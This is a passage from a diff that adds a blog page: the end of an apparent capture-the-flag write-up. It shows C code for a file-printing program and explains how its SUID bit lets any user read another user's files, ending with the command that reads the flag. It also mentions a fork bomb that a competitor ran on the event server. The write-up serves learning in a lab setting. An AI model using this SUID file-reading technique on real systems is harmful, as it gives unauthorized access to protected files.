+</span></span></span><span class="line"><span class="cl">    <span class="n">file</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check if the file was opened successfully
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;An error occured.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Read and print each character from the file
+</span></span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">((</span><span class="n">ch</span> <span class="o">=</span> <span class="nf">fgetc</span><span class="p">(</span><span class="n">file</span><span class="p">))</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">putchar</span><span class="p">(</span><span class="n">ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Close the file
+</span></span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div></details>
+
+<p>It seems this script takes the argument of a file and displays the contents. If we also look at the file&rsquo;s SUID, it is owned by the <code>breakme-harder</code> user, with global executing premission enabled. This means we can run the script without having to be the <code>breakme-harder</code> user, but running this script would be like the <code>breakme-harder</code> user is running it. Now all we have to do is run the file and have the flag file as the argument:</p>
+<pre tabindex="0"><code>-$ ./escalator /home/breakme-harder/flag.txt
+-$ flag{evaluate_this_my_dude}
+</code></pre><!-- raw HTML omitted -->
+<h2 id="final-notes-">Final Notes ~<a href="#final-notes-" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>I would have done the last challenge <code>Aboutface</code> and the <code>King of the Hill (KOTH)</code> parts as well, however the KOTH was on the host of <code>Aboutface</code> and the machine of that challenge shutdown in a little bit over a day into the competition.</p>
+<p>Funny enough too, towards the end of the competition, one of the competitiors ran a <a href="https://en.wikipedia.org/wiki/Fork_bomb">FORKBOMB</a> on the main server and basically shut everything down.</p>
+<p>Overall, an amazing competition and I learned a lot from this!</p>
+
+      </div></div>
+
+  
+    
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>CodeAPretzel</span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
